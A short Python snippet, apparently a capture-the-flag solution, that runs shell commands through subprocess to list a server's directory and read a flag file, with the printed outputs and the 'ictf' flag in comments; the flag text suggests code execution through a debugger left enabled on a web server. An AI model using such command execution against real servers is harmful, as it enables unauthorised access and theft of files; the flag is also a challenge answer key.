import subprocess

out = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout,stderr = out.communicate()

print(stdout)

#b'Dockerfile\ndocker-compose.yml\nman_this_sure_is_an_odd_name_for_a_flag_file\nserver.py\n'

out = subprocess.Popen(['cat', 'man_this_sure_is_an_odd_name_for_a_flag_file'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout, stderr = out.communicate()

print(stdout)

#b'ictf{oops_I_left_my_debugger_on_I_need_to_run_home_before_my_webserver_burns_down}'